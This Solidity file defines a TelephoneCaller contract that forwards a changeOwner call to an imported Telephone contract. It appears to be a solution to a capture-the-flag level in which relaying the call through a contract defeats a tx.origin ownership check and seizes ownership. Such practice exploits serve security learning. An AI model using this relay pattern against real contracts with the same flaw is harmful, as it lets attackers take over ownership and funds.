// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneCaller {
  Telephone telephone;
  address public owner;

  constructor(Telephone _telephone) public {
    telephone = _telephone;
  }

  function callChangeOwner(address _newOwner) public {
    telephone.changeOwner(_newOwner);
  }
}